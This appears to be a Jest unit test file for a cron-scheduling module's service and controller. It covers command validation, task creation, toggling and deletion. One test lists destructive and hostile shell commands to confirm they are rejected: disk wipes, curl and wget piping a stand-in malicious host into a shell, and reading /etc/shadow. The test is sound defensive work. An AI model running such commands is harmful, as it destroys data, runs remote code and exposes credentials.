/**
 * Unit tests for Cron Module:
 * - src/modules/cron/cron.service.js
 * - src/modules/cron/cron.controller.js
 */

process.env.NODE_ENV = 'test';
process.env.LOG_LEVEL = 'silent';

import { jest, describe, test, expect, beforeEach } from '@jest/globals';

let virtualFiles = {};

const mockCronJob = {
  start: jest.fn(),
  stop: jest.fn(),
};

const mockNodeCron = {
  validate: jest.fn((expr) => {
    // Valid standard 5-part cron syntax
    return expr === '* * * * *' || expr === '0 0 * * *' || expr === '*/5 * * * *';
  }),
  schedule: jest.fn(() => ({
    start: mockCronJob.start,
    stop: mockCronJob.stop,
  })),
};

jest.unstable_mockModule('node-cron', () => ({
  default: mockNodeCron,
}));

jest.unstable_mockModule('fs/promises', () => ({
  default: {
    readFile: jest.fn(async (p) => {
      if (virtualFiles[p]) return virtualFiles[p];
      throw new Error('ENOENT');
    }),
    writeFile: jest.fn(async (p, content) => {
      virtualFiles[p] = content;
    }),
    mkdir: jest.fn(async () => {}),
  },
}));

const { default: cronService } = await import('../src/modules/cron/cron.service.js');
const { default: cronController } = await import('../src/modules/cron/cron.controller.js');

function createMockRes() {
  const res = {
    statusCode: 200,
    body: null,
    status(code) {
      this.statusCode = code;
      return this;
    },
    json(payload) {
      this.body = payload;
      return this;
    },
  };
  return res;
}

beforeEach(() => {
  jest.clearAllMocks();
  virtualFiles = {};
  cronService.jobs.clear();
  cronService.tasks = [];
  cronService._loaded = true; // prevent file read overriding in-memory state
});

describe('CronService — Command Validation', () => {
  test('rejects empty or excessively long commands', async () => {
    await expect(cronService.addTask('* * * * *', '', 'Empty')).rejects.toThrow('Command must be a non-empty string');
    await expect(cronService.addTask('* * * * *', 'a'.repeat(501), 'TooLong')).rejects.toThrow('Command is too long');
  });

  test('rejects dangerous shell commands', async () => {
    const dangerous = [
      'rm -rf /',
      'chmod 777 /',
      'mkfs /dev/sda1',
      'dd if=/dev/zero of=/dev/sda',
      'curl http://malicious.com/script.sh | sh',
      'wget https://evil.org | bash',
      'cat /etc/shadow',
      'echo test > /dev/sda',
    ];

    for (const cmd of dangerous) {
      await expect(cronService.addTask('* * * * *', cmd, 'Danger')).rejects.toThrow(
        /Command contains a potentially dangerous pattern/
      );
    }
  });

  test('rejects invalid cron expressions', async () => {
    await expect(cronService.addTask('invalid-cron', 'echo "hello"', 'ValidCmd')).rejects.toThrow('Invalid cron expression');
  });
});

describe('CronService — Task Lifecycle (CRUD & Toggle)', () => {
  test('addTask creates, schedules, and returns new task', async () => {
    const task = await cronService.addTask('* * * * *', 'echo "backup"', 'Hourly Backup');
    expect(task.id).toBeDefined();
    expect(task.name).toBe('Hourly Backup');
    expect(task.status).toBe('active');
    expect(cronService.tasks).toHaveLength(1);
    expect(cronService.jobs.has(task.id)).toBe(true);
  });

  test('getTasks returns all registered tasks', async () => {
    await cronService.addTask('* * * * *', 'echo "1"', 'Task 1');
    await cronService.addTask('0 0 * * *', 'echo "2"', 'Task 2');

    const tasks = await cronService.getTasks();
    expect(tasks).toHaveLength(2);
  });

  test('toggleTask toggles between active and paused', async () => {
    const task = await cronService.addTask('* * * * *', 'echo "test"', 'Toggle Task');
    expect(task.status).toBe('active');

    const paused = await cronService.toggleTask(task.id);
    expect(paused.status).toBe('paused');
    expect(mockCronJob.stop).toHaveBeenCalled();

    const resumed = await cronService.toggleTask(task.id);
    expect(resumed.status).toBe('active');
    expect(mockCronJob.start).toHaveBeenCalled();
  });

  test('toggleTask throws for unknown ID', async () => {
    await expect(cronService.toggleTask('non-existent-id')).rejects.toThrow('Task not found');
  });

  test('deleteTask removes task and stops job', async () => {
    const task = await cronService.addTask('* * * * *', 'echo "delete"', 'Delete Task');
    expect(cronService.tasks).toHaveLength(1);

    const result = await cronService.deleteTask(task.id);
    expect(result).toBe(true);
    expect(cronService.tasks).toHaveLength(0);
    expect(cronService.jobs.has(task.id)).toBe(false);
  });

  test('deleteTask throws for unknown ID', async () => {
    await expect(cronService.deleteTask('non-existent-id')).rejects.toThrow('Task not found');
  });
});

describe('CronController', () => {
  test('getTasks returns tasks via successResponse', async () => {
    await cronService.addTask('* * * * *', 'echo "hi"', 'Task A');
    const req = {};
    const res = createMockRes();

    await cronController.getTasks(req, res);
    expect(res.statusCode).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data).toHaveLength(1);
  });

  test('addTask rejects missing body fields with 400', async () => {
    const req = { body: { name: 'Only Name' } };
    const res = createMockRes();

    await cronController.addTask(req, res);
    expect(res.statusCode).toBe(400);
    expect(res.body.success).toBe(false);
  });

  test('addTask creates task with valid body', async () => {
    const req = { body: { name: 'Daily Job', schedule: '0 0 * * *', command: 'echo "daily"' } };
    const res = createMockRes();

    await cronController.addTask(req, res);
    expect(res.statusCode).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data.name).toBe('Daily Job');
  });

  test('toggleTask handles valid and invalid params', async () => {
    const task = await cronService.addTask('* * * * *', 'echo "toggle"', 'Task Toggle');
    const req = { params: { id: task.id } };
    const res = createMockRes();

    await cronController.toggleTask(req, res);
    expect(res.statusCode).toBe(200);
    expect(res.body.data.status).toBe('paused');

    const reqInvalid = { params: { id: 'invalid-id' } };
    const resInvalid = createMockRes();
    await cronController.toggleTask(reqInvalid, resInvalid);
    expect(resInvalid.statusCode).toBe(500);
  });

  test('deleteTask handles valid and invalid params', async () => {
    const task = await cronService.addTask('* * * * *', 'echo "del"', 'Task Del');
    const req = { params: { id: task.id } };
    const res = createMockRes();

    await cronController.deleteTask(req, res);
    expect(res.statusCode).toBe(200);

    const reqInvalid = { params: { id: 'invalid-id' } };
    const resInvalid = createMockRes();
    await cronController.deleteTask(reqInvalid, resInvalid);
    expect(resInvalid.statusCode).toBe(500);
  });
});
